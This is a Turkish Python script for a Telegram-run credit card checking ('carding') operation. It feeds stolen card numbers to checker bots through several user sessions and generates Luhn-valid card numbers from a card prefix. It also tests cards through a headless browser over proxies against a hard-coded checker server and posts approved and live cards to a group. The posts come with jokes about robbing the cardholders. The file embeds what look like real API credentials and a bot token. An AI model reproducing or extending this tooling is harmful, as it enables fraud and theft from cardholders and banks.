#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# KUBUR OPERASYON MOTORU - AYRI BOT İLE YÖNETİM (2000+ SATIR)
# Kart işlemleri: kullanıcı session'ları (TelegramClient)
# Yönetim: ayrı Telegram Botu (Bot API, token ile)

import os
import re
import asyncio
import random
import json
import logging
import urllib.request
import urllib.error
import shutil
import threading
from datetime import datetime, timedelta
from telethon import TelegramClient, events, errors
from telethon.tl.functions.account import UpdateStatusRequest
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import init, Fore, Style
import time
from flask import Flask, jsonify, render_template_string
import aiosqlite
from apscheduler.schedulers.asyncio import AsyncIOScheduler

# ---------------------------- BAŞLANGIÇ ----------------------------
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("KUBUR")

# Ortam değişkenleri (Railway için)
API_ID = int(os.environ.get("API_ID", 31924590))
API_HASH = os.environ.get("API_HASH", '5c22bfad88d4ef054ac7eab21ecaf1b5')
SESSION_NAME = 'kubur_oturum_v3'
BOT_TOKEN = '8871479802:AAFyypDa378MYn50YdCNwT0GhvIxpQSs6bk'

WORKER_SESSIONS = ['kubur_oturum_v3', 'cado_oturum', 'zone_oturum', 'melo_oturum', 'lia_oturum']

RAVEN_BOT = '@RavenB2_BOT'
RAVEN_GROUP_2_ID = -1003849538454
TARGET_GROUP_ID = int(os.environ.get("TARGET_GROUP_ID", -1003979220547))
LOG_GROUP_ID = int(os.environ.get("LOG_GROUP_ID", -1003962318675))
BALANCE_GROUP_ID = '@balancechkbot'

LOCA_LISTESI = [8661407665, 1441731366, 6277426844, 1915443851, 7932927455]
SES_DOSYASI = 'uyari.mp3'

# ---------------------------- GLOBAL CLIENT (KULLANICI SESSION) ----------------------------
user_client = TelegramClient(SESSION_NAME, API_ID, API_HASH)  # Kart işlemleri için

# ---------------------------- VERİTABANI ----------------------------
DB_PATH = "kubur.db"

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS hafiza (
            kart_no TEXT PRIMARY KEY,
            sonuc TEXT,
            tarih TEXT,
            bin_info TEXT
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS istatistik (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tarih TEXT,
            toplam_kart INTEGER,
            approved INTEGER,
            decline INTEGER,
            live INTEGER,
            avg_response REAL
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS kullanici_limit (
            user_id INTEGER PRIMARY KEY,
            gunluk_limit INTEGER,
            bugun_kullanilan INTEGER,
            son_sifirlama TEXT
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS whitelist (
            user_id INTEGER PRIMARY KEY
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS blacklist (
            user_id INTEGER PRIMARY KEY
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS cron_jobs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            schedule TEXT,
            command TEXT,
            enabled INTEGER DEFAULT 1
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS worker_stats (
            session_name TEXT PRIMARY KEY,
            total_checks INTEGER DEFAULT 0,
            approved_count INTEGER DEFAULT 0,
            last_active TEXT
        )''')
        await db.commit()

# ---------------------------- AYARLAR (DEFAULT) ----------------------------
default_settings = {
    "chk_timeout": "90",
    "bal_timeout": "35",
    "chk_delay": "8",
    "bal_delay": "12",
    "max_parallel_raven": "3",
    "max_parallel_balance": "2",
    "rate_limit_per_minute": "15",
    "daily_card_limit": "500",
    "captcha_api_key": "",
    "proxy_list": "[]",
    "enable_web_dashboard": "true",
    "web_dashboard_port": "5000",
    "pushover_user_key": "",
    "pushover_api_token": "",
    "language": "tr",
    "auto_fix_session": "true",
    "mizah_ac": "true",
    "report_format": "txt"
}

async def load_config():
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute("SELECT key, value FROM config")
        rows = await cursor.fetchall()
        config = default_settings.copy()
        for key, val in rows:
            config[key] = val
        return config

async def save_config(key, value):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
        await db.commit()

# ---------------------------- GLOBALLER (KART İŞLEMLERİ İÇİN) ----------------------------
clients_pool = {}
client_status = {}
worker_roles = {}
user_tasks = {}
balance_queue = asyncio.Queue()
user_collected_cards = {}
user_collection_tasks = {}
pending_duplicate_jobs = {}
current_status = "active"
config_data = None
scheduler = None
rate_limiters = {}

# ---------------------------- MİZAH LİSTESİ ----------------------------
MIZAH_LISTESI = [
    "🐺 Kurtlukta düşeni yemek kanundur, dayıya geçmiş olsun.",
    "🔪 Azdan az, dayının hesaptan çok gider qral!",
    "🥂 Ooo hayırlı işler, dayının ocak söndü biz fişeği yaktık aq.",
    "🔥 Sonunu düşünen kahraman olamaz, yapıştır!",
    "🤫 İki kişinin bildiği sır değildir, bu mal artık bizim kirve.",
    "✂️ Racon kesmiyorum, dayının rızkını kesiyorum.",
    "🚀 Bize de mi lolo dayı? Approved geldi valla!",
    "🦁 Aslan pusuya düşünce affetmez, rızık bize döndü.",
    "🍬 Şehrimin tadı, ağzımın tadı yerine geldi aq!",
    "💰 Savaş abi bizim buralarda bakiye bitmez!",
    "🥶 Kanım dondu İlkkan, bu nasıl bir miktar aq!",
    "🏃‍♂️ Çat çat çat! Mevzu bitti dağılın.",
    "😍 İmkansızım, bu parayı gülüşüne nasıl sığdırdın?",
    "🕴️ Dayının zevkleri bizim nezdimizde makul bir zemine oturmak zorunda değil, çektik gitti.",
    "🥀 Senin benden başka dostun yok, dayının da bizden başka derdi.",
    "⏳ Bırakın geçsin her şeyi zaman, bakiye zaten geçti bize.",
    "🕶️ Cio sen ne anlatıyorsun kardeşim, mevzuyu kopardık biz!",
    "🏘️ Biz Hürriyet Mahallesi çocuğuyuz, affetmeyiz aq!",
    "💅 Kazıdık tırnaklarla geldik buralara dayı, hakkımızdır.",
    "🗣️ Bu neyin bademciği kardeşim, at şu malı da yolumuza bakalım.",
    "💀 Ölüm dediğin nedir ki gülüm, ben senin için dayıyı soymayı göze almışım.",
    "👁️ Sadece ölüler görür, bir de biz görürüz aq.",
    "🤦‍♂️ Senin yüzünden insan içine çıkacak yüzüm kalmadı İlkkan, bereket versin Approved!",
    "🚓 Alo bura merkez, dayıyı paket ettik tamam.",
    "🏃‍♂️ Kovala kovala bitmez bu yol, dayının para bitti ama.",
    "💨 Bizim seninle muhatap olma zorunluluğumuz yok dayı, parayı aldık kaçıyoruz.",
    "📉 Ya sen gerçekten vizyonsuz bir insansın İlkkan, bak millet neler koparıyor.",
    "🔫 Mermi manyağı yaparım seni dayı, sessizce vedalaş paranla.",
    "🏴‍☠️ Anafor ne işin var senin burada, dayının mekanına çöktük!",
    "🌶️ Bize her yer Adana değil, biz her yerde Adanalıyız qral!",
    "🚏 Bi' sonraki durağım neresi? Dayının diğer malı aq.",
    "🏃‍♂️ Hayallerim var, dayının parasıyla peşindeyim koşa koşa.",
    "🤝 İnsanların kendi hayatlarını mahvetme hakkına saygı duymalısın İlkkan, biz sadece vesileyiz.",
    "🎭 Kardeşim ben senin yılğın bir hoşgörüyle beni benimsemene mi kaldım, ver malı aq!",
    "🚫 Dostum olmaz, bakiye yaşamaz qral.",
    "🏙️ Sıfır bir, burası Adana merkez, dayıyı soyduk herkes serbest.",
    "☀️ Kardeşim biz Adana çocuğuyuz, geri vites olmaz.",
    "🔫 Senin o kafana sıkarım dayı, bakiyeyi usulca bırak.",
    "🤖 Bana akıl verme İlkkan, parayı ver!",
    "🎶 Geceler geceler, dayının kartının peşindeler aq...",
    "🦅 Bizim mahallede mevzu bitmez, dayı neye uğradığını şaşırdı.",
    "🚬 Mevzuyu çözdük qral, dayıya geçmiş olsun sigarasını yakalım."
]

# ---------------------------- YARDIMCI FONKSİYONLAR (KART İŞLEMLERİ) ----------------------------
def card_parser(text):
    pattern = r'(\d{15,16})[\s:/|\\,.-]+(\d{2})[\s:/|\\,.-]+(\d{2,4})(?:[\s:/|\\,.-]+(\d{3,4}))?'
    match = re.search(pattern, text)
    if match:
        num, month, year, cvv = match.groups()
        year = "20" + year[-2:]
        return f"{num}|{month}|{year}|{cvv}" if cvv else f"{num}|{month}|{year}"
    return None

async def bin_sorgula(kart_no):
    bin_kod = kart_no[:6]
    try:
        url = f"https://lookup.binlist.net/{bin_kod}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'Accept-Version': '3'})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            banka = data.get('bank', {}).get('name', 'Bilinmiyor')
            ulke = data.get('country', {}).get('alpha2', 'Bilinmiyor')
            tip = data.get('type', 'Bilinmiyor').upper()
            banka = banka.replace('_', ' ').replace('*', '')
            return f"🏦 {banka} | 🌍 {ulke} | 💳 {tip}"
    except:
        return "🏦 Bilinmiyor | 🌍 Bilinmiyor"

async def hafiza_kaydet(kart_no, sonuc, bin_info=""):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("REPLACE INTO hafiza (kart_no, sonuc, tarih, bin_info) VALUES (?, ?, ?, ?)",
                         (kart_no, sonuc, datetime.now().isoformat(), bin_info))
        await db.commit()

async def hafiza_oku(kart_no):
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute("SELECT sonuc, tarih, bin_info FROM hafiza WHERE kart_no=?", (kart_no,))
        return await cursor.fetchone()

async def update_worker_stats(session_name, approved=False):
    async with aiosqlite.connect(DB_PATH) as db:
        if approved:
            await db.execute("UPDATE worker_stats SET total_checks = total_checks+1, approved_count = approved_count+1, last_active = ? WHERE session_name=?",
                             (datetime.now().isoformat(), session_name))
        else:
            await db.execute("UPDATE worker_stats SET total_checks = total_checks+1, last_active = ? WHERE session_name=?",
                             (datetime.now().isoformat(), session_name))
        await db.commit()

# ---------------------------- SESSION YÖNETİMİ ----------------------------
async def check_session_health(worker_name, client_obj):
    try:
        me = await client_obj.get_me()
        await client_obj(UpdateStatusRequest(offline=False))
        return True
    except Exception as e:
        logger.error(f"Session {worker_name} sağlıksız: {e}")
        await user_client.send_message(LOG_GROUP_ID, f"⚠️ Session bozuldu: {worker_name}\nHata: {str(e)[:100]}")
        return False

async def repair_session(worker_name):
    global clients_pool, client_status
    try:
        await clients_pool[worker_name].disconnect()
        await asyncio.sleep(2)
        new_client = TelegramClient(worker_name, API_ID, API_HASH)
        await new_client.start()
        clients_pool[worker_name] = new_client
        client_status[worker_name] = "free"
        logger.info(f"Session {worker_name} başarıyla onarıldı.")
        await new_client.send_message(LOG_GROUP_ID, f"✅ Session onarıldı: {worker_name}")
        return True
    except Exception as e:
        logger.error(f"Session {worker_name} onarılamadı: {e}")
        client_status[worker_name] = "broken"
        return False

async def session_auto_fix_loop():
    while True:
        await asyncio.sleep(60)
        if config_data.get("auto_fix_session") == "true":
            for name, cl in list(clients_pool.items()):
                if client_status.get(name) != "busy":
                    healthy = await check_session_health(name, cl)
                    if not healthy and client_status.get(name) != "broken":
                        await repair_session(name)

# ---------------------------- RATE LIMIT ----------------------------
class RateLimiter:
    def __init__(self, max_per_minute):
        self.max_per_minute = max_per_minute
        self.tokens = max_per_minute
        self.last_refill = time.time()
        self.lock = asyncio.Lock()
    
    async def acquire(self):
        async with self.lock:
            now = time.time()
            if now - self.last_refill >= 60:
                self.tokens = self.max_per_minute
                self.last_refill = now
            if self.tokens > 0:
                self.tokens -= 1
                return True
            return False

# ---------------------------- BEKLEME FONKSİYONU ----------------------------
async def wait_for_response(worker_client, command, card, target_chat, mode="chk"):
    timeout = int(config_data.get(f"{mode}_timeout", "90"))
    max_attempts = 2
    limiter = rate_limiters.get(worker_client.session.filename)
    if limiter and not await limiter.acquire():
        await asyncio.sleep(10)
    for attempt in range(max_attempts):
        if current_status == "stopped":
            return "STOPPED"
        try:
            msg_payload = f"{command} {card}".strip() if command else f"{card}"
            sent_msg = await worker_client.send_message(target_chat, msg_payload)
            sent_id = sent_msg.id
            start_time = datetime.now()
            last_msg_id = sent_id
            while (datetime.now() - start_time).total_seconds() < timeout:
                await asyncio.sleep(2.5)
                try:
                    async for msg in worker_client.iter_messages(target_chat, limit=5):
                        if msg.id > last_msg_id:
                            last_msg_id = msg.id
                            msg_text = (msg.text or "")
                            if card.split('|')[0] in msg_text:
                                if "too long" in msg_text.lower():
                                    break
                                return msg_text
                except errors.FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except:
                    continue
            return "TIMEOUT"
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except:
            if attempt == max_attempts-1:
                return "ERROR"
            await asyncio.sleep(3)
    return "FAILED"

# ---------------------------- RAVEN İŞLEMLERİ ----------------------------
async def process_single_card(worker_client, card, user, target_chat, results_list):
    if current_status == "stopped":
        return
    res = await wait_for_response(worker_client, ".chk", card, target_chat, "chk")
    res_text = res if res else "TIMEOUT"
    results_list.append(f"{card} | {res_text.strip()}")
    res_lower = res_text.lower()
    if "approved" in res_lower or "policy" in res_lower:
        mizah = random.choice(MIZAH_LISTESI) if config_data.get("mizah_ac") == "true" else ""
        status_lbl = "Approved ✅" if "approved" in res_lower else "Approved (Policy) 🏴‍☠️"
        bin_info = await bin_sorgula(card.split('|')[0])
        await update_worker_stats(worker_client.session.filename, approved=True)
        msg = f"{mizah}\n\n💳 Kart: `{card}`\nℹ️ BIN: {bin_info}\n✅ {status_lbl}\n👤 @{user}"
        await worker_client.send_message(TARGET_GROUP_ID, msg)
    else:
        await update_worker_stats(worker_client.session.filename, approved=False)
    await hafiza_kaydet(card.split('|')[0], res_text.strip(), bin_info)
    await asyncio.sleep(int(config_data.get("chk_delay", "8")))

async def run_raven_worker(task_data):
    cards = task_data["cards"]
    user = task_data["user"]
    available = [name for name, state in client_status.items() if state == "free" and 'raven' in worker_roles.get(name, [])]
    if not available:
        await asyncio.sleep(2)
        available = [name for name, state in client_status.items() if state == "free" and 'raven' in worker_roles.get(name, [])]
    if not available:
        return
    worker_name = random.choice(available)
    client_status[worker_name] = "busy"
    worker_client = clients_pool[worker_name]
    results = []
    try:
        chunk_size = 20
        for i in range(0, len(cards), chunk_size):
            chunk = cards[i:i+chunk_size]
            tasks = []
            for card in chunk:
                tasks.append(process_single_card(worker_client, card, user, RAVEN_BOT, results))
            await asyncio.gather(*tasks)
        if results:
            report_name = f"rapor_{datetime.now().strftime('%H%M%S')}.txt"
            with open(report_name, "w", encoding="utf-8") as f:
                f.write("\n".join(results))
            await worker_client.send_file(TARGET_GROUP_ID, report_name, caption=f"🏁 @{user}, Raven raporu")
            os.remove(report_name)
    finally:
        client_status[worker_name] = "free"
        if task_data.get("user_id") in user_tasks:
            del user_tasks[task_data["user_id"]]

# ---------------------------- BALANCE KUYRUĞU ----------------------------
async def balance_worker_loop():
    while True:
        if current_status == "stopped":
            await asyncio.sleep(1)
            continue
        try:
            task_data = await asyncio.wait_for(balance_queue.get(), timeout=2)
        except asyncio.TimeoutError:
            continue
        available = [name for name, state in client_status.items() if state == "free" and 'balance' in worker_roles.get(name, [])]
        if not available:
            await balance_queue.put(task_data)
            await asyncio.sleep(2)
            continue
        worker_name = random.choice(available)
        client_status[worker_name] = "busy"
        worker_client = clients_pool[worker_name]
        results = []
        try:
            for card in task_data["cards"]:
                if current_status == "stopped":
                    break
                res = await wait_for_response(worker_client, "", f"{card} {task_data['amount']}", BALANCE_GROUP_ID, "bal")
                res_text = res if res else "TIMEOUT"
                results.append(f"{card} | {res_text.strip()}")
                if "balance query successful" in res_text.lower() or "bakiye" in res_text.lower():
                    mizah = random.choice(MIZAH_LISTESI) if config_data.get("mizah_ac") == "true" else ""
                    bin_info = await bin_sorgula(card.split('|')[0])
                    msg = f"{mizah}\n\n💳 Kart: `{card}`\nℹ️ BIN: {bin_info}\n💰 Bakiye başarılı!\n💵 Miktar: {task_data['amount']}\n👤 @{task_data['user']}"
                    await worker_client.send_message(TARGET_GROUP_ID, msg)
                await hafiza_kaydet(card.split('|')[0], res_text.strip(), bin_info)
                await asyncio.sleep(int(config_data.get("bal_delay", "12")))
            if results:
                report_name = f"rapor_bal_{datetime.now().strftime('%H%M%S')}.txt"
                with open(report_name, "w", encoding="utf-8") as f:
                    f.write("\n".join(results))
                await worker_client.send_file(TARGET_GROUP_ID, report_name, caption=f"🏁 @{task_data['user']}, Balance raporu")
                os.remove(report_name)
        finally:
            client_status[worker_name] = "free"
            if task_data.get("user_id") in user_tasks:
                del user_tasks[task_data["user_id"]]

# ---------------------------- SELENIUM ----------------------------
def luhn_checksum(card_number):
    digits = [int(x) for x in str(card_number)]
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10

def generate_cards(root_12, skt, count=1000):
    generated = []
    try:
        month, year = skt.split('/')
        for _ in range(count):
            mid_3 = "".join(str(random.randint(0, 9)) for _ in range(3))
            temp_15 = f"{root_12}{mid_3}"
            check_digit = (10 - luhn_checksum(temp_15 + "0")) % 10
            card = f"{temp_15}{check_digit}|{month}|20{year[-2:]}|{random.randint(100, 999)}"
            generated.append(card)
    except:
        pass
    return generated

async def run_selenium_checker(cards, user):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--remote-debugging-port=9222")
    chrome_options.binary_location = "/usr/bin/chromium-browser" if os.path.exists("/usr/bin/chromium-browser") else "/usr/bin/chromium"
    proxies = json.loads(config_data.get("proxy_list", "[]"))
    if proxies:
        proxy = random.choice(proxies)
        chrome_options.add_argument(f'--proxy-server={proxy}')
    try:
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 60)
        await user_client.send_message(TARGET_GROUP_ID, f"🚀 @{user}, Selenium başladı ({len(cards)} kart)")
        with open("sonuclar.txt", "a", encoding="utf-8") as f:
            for data in cards:
                if current_status == "stopped":
                    break
                url = f"http://65.108.73.184/ido.php?lista={data}"
                try:
                    driver.get(url)
                    err = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "order-confirmation-error-details-content")))
                    code = err.find_element(By.XPATH, ".//span[contains(text(), 'Hata Kodu')]/following-sibling::p").text.strip()
                    desc = err.find_element(By.XPATH, ".//span[contains(text(), 'Açıklama')]/following-sibling::p").text.strip()
                    live_keywords = ["yetersiz bakiye", "ödeme alınamadı"]
                    if any(kw in desc.lower() for kw in live_keywords):
                        await user_client.send_message(TARGET_GROUP_ID, f"✅ #Live: `{data}`\n{code} - {desc}")
                        f.write(f"#Live - {data} => {code} - {desc}\n")
                    else:
                        f.write(f"#Decline - {data} => {code} - {desc}\n")
                except Exception as e:
                    logger.error(f"Selenium hatası: {e}")
                await asyncio.sleep(10)
        driver.quit()
        await user_client.send_message(TARGET_GROUP_ID, f"🏁 @{user}, Selenium bitti.")
    except Exception as e:
        await user_client.send_message(TARGET_GROUP_ID, f"❌ Selenium hatası: {e}")

# ---------------------------- İSTATİSTİKLER ----------------------------
async def get_stats():
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute("SELECT COUNT(*) FROM hafiza")
        total_cards = (await cursor.fetchone())[0]
        cursor = await db.execute("SELECT COUNT(*) FROM hafiza WHERE sonuc LIKE '%approved%'")
        approved = (await cursor.fetchone())[0]
        cursor = await db.execute("SELECT COUNT(*) FROM hafiza WHERE sonuc LIKE '%live%'")
        live = (await cursor.fetchone())[0]
        cursor = await db.execute("SELECT session_name, total_checks, approved_count FROM worker_stats")
        workers = await cursor.fetchall()
        cursor = await db.execute("SELECT COUNT(DISTINCT user_id) FROM kullanici_limit WHERE son_sifirlama = date('now')")
        active_users = (await cursor.fetchone())[0]
        return {
            "total_cards": total_cards,
            "approved": approved,
            "live": live,
            "workers": workers,
            "active_users": active_users
        }

# ---------------------------- WEB DASHBOARD ----------------------------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>KUBUR Dashboard</title></head>
<body>
<h1>KUBUR Bot İstatistikleri</h1>
<p>Toplam Kart: {{ stats.total_cards }}</p>
<p>Approved: {{ stats.approved }}</p>
<p>Live: {{ stats.live }}</p>
<p>Aktif Kullanıcı: {{ stats.active_users }}</p>
<h2>Worker Performansı</h2>
<ul>
{% for w in stats.workers %}
<li>{{ w[0] }} - Toplam: {{ w[1] }}, Approved: {{ w[2] }} (%{{ (w[2]/w[1]*100)|round(1) if w[1] > 0 else 0 }})</li>
{% endfor %}
</ul>
</body>
</html>
'''

def start_web_dashboard():
    app = Flask(__name__)
    @app.route('/')
    async def index():
        stats = await get_stats()
        return render_template_string(HTML_TEMPLATE, stats=stats)
    @app.route('/api/stats')
    async def api_stats():
        stats = await get_stats()
        return jsonify(stats)
    port = int(config_data.get("web_dashboard_port", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

# ---------------------------- CRON İŞLERİ ----------------------------
async def cron_runner():
    global scheduler
    scheduler = AsyncIOScheduler()
    async def hourly_backup():
        await user_client.send_message(LOG_GROUP_ID, "📦 Otomatik yedekleme başlıyor...")
        zip_name = f"kubur_yedek_{datetime.now().strftime('%Y%m%d_%H%M')}"
        shutil.make_archive(zip_name, 'zip', '.')
        await user_client.send_file(LOG_GROUP_ID, f"{zip_name}.zip", caption="Otomatik yedek")
        os.remove(f"{zip_name}.zip")
    async def daily_reset():
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE kullanici_limit SET bugun_kullanilan = 0, son_sifirlama = date('now')")
            await db.commit()
        logger.info("Günlük limitler sıfırlandı.")
    scheduler.add_job(hourly_backup, 'cron', hour='*', minute='0')
    scheduler.add_job(daily_reset, 'cron', hour='0', minute='0')
    scheduler.start()

# =========================== BOT API (AYRI YÖNETİM BOTU) ===========================
# Bu bot sadece yetkili kullanıcılara (LOCA_LISTESI) hizmet verir, özelden yazışılır.

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("❌ Bu bot sadece yetkili kullanıcılara açıktır.")
        return
    await update.message.reply_text("🤖 **KUBUR Yönetim Botu**\n\n"
                                    "Kart işlemleri ana sistem üzerinden devam ediyor.\n"
                                    "Bu bot ile tüm ayarları değiştirebilir, istatistikleri görüntüleyebilirsiniz.\n\n"
                                    "📌 Kullanılabilir komutlar:\n"
                                    "/ayar - Butonlu ayar menüsü\n"
                                    "/stats - İstatistikler\n"
                                    "/workers - Worker durumları\n"
                                    "/ping - Sağlık kontrolü\n"
                                    "/yedekle - Yedek al\n"
                                    "/session_kurtar <ad> - Session onar\n"
                                    "/limit <sayı> - Günlük kart limiti\n"
                                    "/mizah - Mizah aç/kapa\n"
                                    "/iptal - Tüm işlemleri durdur\n"
                                    "/devam - Devam et\n"
                                    "/dur - Bekleme modu")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    await update.message.reply_text("🏓 Pong! Ana sistem çalışıyor.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    stats = await get_stats()
    msg = (f"📊 **İSTATİSTİKLER**\n"
           f"Toplam Kart: {stats['total_cards']}\n"
           f"Approved: {stats['approved']}\n"
           f"Live: {stats['live']}\n"
           f"Aktif Kullanıcı (bugün): {stats['active_users']}\n\n"
           f"**Worker bazlı:**\n")
    for w in stats['workers']:
        rate = (w[2]/w[1]*100) if w[1] > 0 else 0
        msg += f"• {w[0]}: {w[1]} sorgu, {w[2]} approved (%{rate:.1f})\n"
    await update.message.reply_text(msg)

async def workers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    msg = "**Worker Durumları:**\n"
    for name in WORKER_SESSIONS:
        status = client_status.get(name, "unknown")
        role = worker_roles.get(name, [])
        emoji = "🟢" if status == "free" else "🔴" if status == "busy" else "⚠️"
        msg += f"{emoji} `{name}` – {role} – {status}\n"
    await update.message.reply_text(msg)

async def yedekle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    await update.message.reply_text("📦 Yedek alınıyor, biraz bekleyin...")
    zip_name = f"kubur_yedek_{datetime.now().strftime('%Y%m%d_%H%M')}"
    shutil.make_archive(zip_name, 'zip', '.')
    await update.message.reply_document(document=open(f"{zip_name}.zip", 'rb'), filename=f"{zip_name}.zip", caption="Yedek dosyası")
    os.remove(f"{zip_name}.zip")

async def session_kurtar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    if not context.args:
        await update.message.reply_text("Kullanım: /session_kurtar <session_adı>")
        return
    session_name = context.args[0]
    if session_name in clients_pool:
        await update.message.reply_text(f"🔧 {session_name} onarılıyor...")
        success = await repair_session(session_name)
        if success:
            await update.message.reply_text(f"✅ {session_name} onarıldı.")
        else:
            await update.message.reply_text(f"❌ {session_name} onarılamadı.")
    else:
        await update.message.reply_text(f"❌ {session_name} bulunamadı.")

async def limit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Kullanım: /limit <sayı> (örn: /limit 1000)")
        return
    new_limit = context.args[0]
    await save_config("daily_card_limit", new_limit)
    config_data["daily_card_limit"] = new_limit
    await update.message.reply_text(f"✅ Günlük kart limiti {new_limit} olarak ayarlandı.")

async def mizah_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    current = config_data.get("mizah_ac") == "true"
    new_val = "false" if current else "true"
    await save_config("mizah_ac", new_val)
    config_data["mizah_ac"] = new_val
    await update.message.reply_text(f"✅ Mizah mesajları {'açıldı' if new_val=='true' else 'kapatıldı'}.")

async def iptal_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_status, balance_queue, user_tasks
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    current_status = "stopped"
    user_tasks.clear()
    while not balance_queue.empty():
        try: balance_queue.get_nowait()
        except: break
    await update.message.reply_text("🚫 Tüm işler iptal edildi, kuyruk temizlendi.")

async def devam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_status
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    current_status = "active"
    await update.message.reply_text("▶️ Sistem devam ediyor.")

async def dur_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_status
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    current_status = "waiting"
    await update.message.reply_text("⏸ Sistem beklemeye alındı.")

# =========================== BUTONLU MENÜLER (BOT API) ===========================
async def ayar_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        await update.message.reply_text("Yetkisiz erişim.")
        return
    buttons = [
        [InlineKeyboardButton("⚙️ Temel Ayarlar", callback_data="menu_temel")],
        [InlineKeyboardButton("🚀 Worker Yönetimi", callback_data="menu_workers")],
        [InlineKeyboardButton("📊 Limit & Rate", callback_data="menu_limit")],
        [InlineKeyboardButton("🔧 Gelişmiş (Proxy/Captcha/Push)", callback_data="menu_advanced")],
        [InlineKeyboardButton("🔄 Session & Cron", callback_data="menu_session")],
        [InlineKeyboardButton("📁 Rapor & Dashboard", callback_data="menu_report")],
        [InlineKeyboardButton("❌ Kapat", callback_data="menu_close")]
    ]
    await update.message.reply_text("⚙️ **KUBUR AYAR MENÜSÜ**\nButonlara tıklayarak ayarları değiştirin.", reply_markup=InlineKeyboardMarkup(buttons))

async def menu_temel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chk_delay = config_data.get("chk_delay", "8")
    bal_delay = config_data.get("bal_delay", "12")
    mizah = "✅ Açık" if config_data.get("mizah_ac") == "true" else "❌ Kapalı"
    lang = "🇹🇷 Türkçe" if config_data.get("language") == "tr" else "🇬🇧 English"
    buttons = [
        [InlineKeyboardButton(f"⏱️ Raven Bekleme: {chk_delay}s", callback_data="set_chk_delay")],
        [InlineKeyboardButton(f"⏱️ Balance Bekleme: {bal_delay}s", callback_data="set_bal_delay")],
        [InlineKeyboardButton(f"😂 Mizah: {mizah}", callback_data="toggle_mizah")],
        [InlineKeyboardButton(f"🌐 Dil: {lang}", callback_data="toggle_lang")],
        [InlineKeyboardButton("🔙 Geri", callback_data="menu_main")]
    ]
